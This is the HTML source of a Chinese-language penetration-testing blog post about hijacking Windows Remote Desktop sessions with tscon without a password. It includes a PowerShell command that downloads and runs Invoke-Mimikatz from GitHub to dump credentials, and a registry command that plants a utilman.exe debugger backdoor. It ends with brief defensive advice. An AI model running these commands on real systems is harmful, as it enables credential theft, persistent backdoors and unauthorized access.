@@ -1,0 +1,273 @@
+<!DOCTYPE html>
+<html>
+<head><meta name="generator" content="Hexo 3.8.0">
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <meta name="description" content="​    1、 Windows系统下，tscon可被用来切换远程桌面的会话。正常情况下，切换会话时需要提供登录密码，但通过特殊的利用方法能够绕过验证，不输入密码实现未授权登录。​参考三好学生师傅的文章，故经过实际情况，发现还是有很多出路，故小结下自己的小思路。 对于开启远程桌面服务的Windows系统，当有多个用户登录该系统时，会产生多个会话，如下图：测试系统： Server 2008 R2用户A">
+<meta property="og:type" content="article">
+<meta property="og:title" content="利用tscon未授权登录远程桌面">
+<meta property="og:url" content="http://yoursite.com/2019/01/17/利用tscon未授权登录远程桌面/index.html">
+<meta property="og:site_name" content="c1y2m3’blog">
+<meta property="og:description" content="​    1、 Windows系统下，tscon可被用来切换远程桌面的会话。正常情况下，切换会话时需要提供登录密码，但通过特殊的利用方法能够绕过验证，不输入密码实现未授权登录。​参考三好学生师傅的文章，故经过实际情况，发现还是有很多出路，故小结下自己的小思路。 对于开启远程桌面服务的Windows系统，当有多个用户登录该系统时，会产生多个会话，如下图：测试系统： Server 2008 R2用户A">
+<meta property="og:locale" content="default">
+<meta property="og:image" content="https://www.yunzhijia.com/microblog/filesvr/5c404179db5aa630d38302fb">
+<meta property="og:image" content="https://www.yunzhijia.com/microblog/filesvr/5c4041a050f8dd61e0410f24">
+<meta property="og:image" content="https://www.yunzhijia.com/microblog/filesvr/5c4041b89b521a6695ab0076">
+<meta property="og:image" content="https://www.yunzhijia.com/microblog/filesvr/5c4041ce50f8dd61e04113e5">
+<meta property="og:image" content="https://www.yunzhijia.com/microblog/filesvr/5c4041e42711cd053c709956">
+<meta property="og:updated_time" content="2019-01-17T08:57:03.000Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="利用tscon未授权登录远程桌面">
+<meta name="twitter:description" content="​    1、 Windows系统下，tscon可被用来切换远程桌面的会话。正常情况下，切换会话时需要提供登录密码，但通过特殊的利用方法能够绕过验证，不输入密码实现未授权登录。​参考三好学生师傅的文章，故经过实际情况，发现还是有很多出路，故小结下自己的小思路。 对于开启远程桌面服务的Windows系统，当有多个用户登录该系统时，会产生多个会话，如下图：测试系统： Server 2008 R2用户A">
+<meta name="twitter:image" content="https://www.yunzhijia.com/microblog/filesvr/5c404179db5aa630d38302fb">
+    
+    
+        
+          
+              <link rel="shortcut icon" href="/c1y2m3.github.io/images/favicon.ico">
+          
+        
+        
+          
+            <link rel="icon" type="image/png" href="/c1y2m3.github.io/images/favicon-192x192.png" sizes="192x192">
+          
+        
+        
+          
+            <link rel="apple-touch-icon" sizes="180x180" href="/c1y2m3.github.io/images/apple-touch-icon.png">
+          
+        
+    
+    <!-- title -->
+    <title>利用tscon未授权登录远程桌面</title>
+    <!-- styles -->
+    <link rel="stylesheet" href="/c1y2m3.github.io/css/style.css">
+    <!-- persian styles -->
+    
+      <link rel="stylesheet" href="/c1y2m3.github.io/css/rtl.css">
+    
+    <!-- rss -->
+    
+    
+</head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/c1y2m3.github.io/">主页</a></li>
+         
+          <li><a href="/c1y2m3.github.io/About/">关于</a></li>
+         
+          <li><a href="/c1y2m3.github.io/archives/">文章</a></li>
+         
+          <li><a href="/c1y2m3.github.io/projects_url">生活</a></li>
+        
+      </ul>
+    </span>
+    <br>
+    <span id="actions">
+      <ul>
+        
+        
+        <li><a class="icon" href="/c1y2m3.github.io/2019/01/06/Redis在Windows环境下Getshell/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://yoursite.com/2019/01/17/利用tscon未授权登录远程桌面/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://yoursite.com/2019/01/17/利用tscon未授权登录远程桌面/&text=利用tscon未授权登录远程桌面"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://yoursite.com/2019/01/17/利用tscon未授权登录远程桌面/&title=利用tscon未授权登录远程桌面"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://yoursite.com/2019/01/17/利用tscon未授权登录远程桌面/&is_video=false&description=利用tscon未授权登录远程桌面"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=利用tscon未授权登录远程桌面&body=Check out this article: http://yoursite.com/2019/01/17/利用tscon未授权登录远程桌面/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://yoursite.com/2019/01/17/利用tscon未授权登录远程桌面/&title=利用tscon未授权登录远程桌面"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://yoursite.com/2019/01/17/利用tscon未授权登录远程桌面/&title=利用tscon未授权登录远程桌面"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://yoursite.com/2019/01/17/利用tscon未授权登录远程桌面/&title=利用tscon未授权登录远程桌面"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://yoursite.com/2019/01/17/利用tscon未授权登录远程桌面/&title=利用tscon未授权登录远程桌面"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://yoursite.com/2019/01/17/利用tscon未授权登录远程桌面/&name=利用tscon未授权登录远程桌面&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope="" itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        利用tscon未授权登录远程桌面
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+        <span itemprop="name">c1y2m3’blog</span>
+      </span>
+      
+    <div class="postdate">
+        <time datetime="2019-01-17T08:56:14.000Z" itemprop="datePublished">2019-01-17</time>
+    </div>
+
+
+      
+
+      
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <p>​    1、 Windows系统下，tscon可被用来切换远程桌面的会话。正常情况下，切换会话时需要提供登录密码，但通过特殊的利用方法能够绕过验证，不输入密码实现未授权登录。<br>​<br>参考三好学生师傅的文章，故经过实际情况，发现还是有很多出路，故小结下自己的小思路。</p>
+<p>对于开启远程桌面服务的Windows系统，当有多个用户登录该系统时，会产生多个会话，如下图：<br>测试系统： Server 2008 R2<br>用户Administrator为本地登录  </p>
+<p>用户college通过远程桌面服务(RDP)想要切换至用户administraror,可通过右键-Connect进行连接，接着输入密码即可。</p>
+<p>如下图：</p>
+<p><img src="https://www.yunzhijia.com/microblog/filesvr/5c404179db5aa630d38302fb" alt=""></p>
+<p>tscon是命令行下使用的工具，可实现相同的功能。</p>
+<p>首先获取用户对应的sessionid,执行如下命令：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">query user</span><br></pre></td></tr></table></figure>
+<p><img src="https://www.yunzhijia.com/microblog/filesvr/5c4041a050f8dd61e0410f24" alt=""></p>
+<p>用户administrator对应的sessionsid为2 </p>
+<p>通过tscon切换到用户管理员的桌面，命令如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tscon 3 /PASSWORD：XXXXX</span><br></pre></td></tr></table></figure>
+<p>通过三好学生师傅的方法、获取System权限，就能绕过输入密码的过程，直接切换。</p>
+<p>参考 ：</p>
+<p><a href="https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-%E4%BB%8EAdmin%E6%9D%83%E9%99%90%E5%88%87%E6%8D%A2%E5%88%B0System%E6%9D%83%E9%99%90/" target="_blank" rel="noopener">渗透技巧——从Admin权限切换到System权限</a></p>
+<p>但在默些环境中，常常被系统策略阻断了，常常不得以实现。</p>
+<p><img src="https://www.yunzhijia.com/microblog/filesvr/5c4041b89b521a6695ab0076" alt=""></p>
+<p>通常一般拿到webshell后、进行mimikatz一波输出、dump出用户组的ntlm，如果exe被杀软拦截了或组策略限制了， 那依然还是可以使用Powershell进行操作</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell &quot;IEX (New-Object Net.WebClient).DownloadString(&apos;https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1&apos;); Invoke-Mimikatz -DumpCreds&quot;</span><br></pre></td></tr></table></figure>
+<p>由于菜刀处于非交换模式，默些情况导致无法运行突破UAC的运行的下，可用辅助工具管理器后门(放大镜后门原理相同，进程为sethc.exe)配合tscon绕过系统登录界面</p>
+<p>通过注册表劫持实现后门，修改注册表的命令如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">REG ADD &quot;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\utilman.exe&quot; /t REG_SZ /v Debugger /d &quot;C:\windows\system32\cmd.exe&quot; /f</span><br></pre></td></tr></table></figure>
+<p>在登录界面启动辅助工具管理器，弹出cmd.exe，权限为system，如下图：</p>
+<p>即可成功从本地用户组跳入域主机内。</p>
+<p><img src="https://www.yunzhijia.com/microblog/filesvr/5c4041ce50f8dd61e04113e5" alt=""></p>
+<p><strong>补充：</strong></p>
+<p>在登录界面状态下，降权方法受限，SelectMyParent和Invoke-TokenManipulation.ps1均报错</p>
+<p>使用incognito能够成功降权，但是操作受限如下图：</p>
+<p><img src="https://www.yunzhijia.com/microblog/filesvr/5c4041e42711cd053c709956" alt=""></p>
+<p>#防御建议：</p>
+<p>建议用户使用注销用户的方式断开远程桌面，注销后，无法通过tscon获得桌面会话</p>
+<p>监控系统用户的登录日志，攻击者需要先远程登录系统后才能做进一步利用：未授权切换桌面会话</p>
+<p>对于Windows系统，需要注意攻击者如果获得了系统的访问权限，能够利用放大镜和辅助工具管理器后门实现未授权登录</p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/c1y2m3.github.io/">主页</a></li>
+         
+          <li><a href="/c1y2m3.github.io/About/">关于</a></li>
+         
+          <li><a href="/c1y2m3.github.io/archives/">文章</a></li>
+         
+          <li><a href="/c1y2m3.github.io/projects_url">生活</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://yoursite.com/2019/01/17/利用tscon未授权登录远程桌面/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://yoursite.com/2019/01/17/利用tscon未授权登录远程桌面/&text=利用tscon未授权登录远程桌面"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://yoursite.com/2019/01/17/利用tscon未授权登录远程桌面/&title=利用tscon未授权登录远程桌面"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://yoursite.com/2019/01/17/利用tscon未授权登录远程桌面/&is_video=false&description=利用tscon未授权登录远程桌面"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=利用tscon未授权登录远程桌面&body=Check out this article: http://yoursite.com/2019/01/17/利用tscon未授权登录远程桌面/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://yoursite.com/2019/01/17/利用tscon未授权登录远程桌面/&title=利用tscon未授权登录远程桌面"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://yoursite.com/2019/01/17/利用tscon未授权登录远程桌面/&title=利用tscon未授权登录远程桌面"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://yoursite.com/2019/01/17/利用tscon未授权登录远程桌面/&title=利用tscon未授权登录远程桌面"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://yoursite.com/2019/01/17/利用tscon未授权登录远程桌面/&title=利用tscon未授权登录远程桌面"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://yoursite.com/2019/01/17/利用tscon未授权登录远程桌面/&name=利用tscon未授权登录远程桌面&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy; 2019 John Doe
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/c1y2m3.github.io/">主页</a></li>
+         
+          <li><a href="/c1y2m3.github.io/About/">关于</a></li>
+         
+          <li><a href="/c1y2m3.github.io/archives/">文章</a></li>
+         
+          <li><a href="/c1y2m3.github.io/projects_url">生活</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+</body>
+</html>
+<!-- styles -->
+<link rel="stylesheet" href="/c1y2m3.github.io/lib/font-awesome/css/all.min.css">
+<link rel="stylesheet" href="/c1y2m3.github.io/lib/justified-gallery/css/justifiedGallery.min.css">
+
+<!-- jquery -->
+<script src="/c1y2m3.github.io/lib/jquery/jquery.min.js"></script>
+<script src="/c1y2m3.github.io/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>
+<script src="/c1y2m3.github.io/js/main.js"></script>
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Disqus Comments -->
+
+
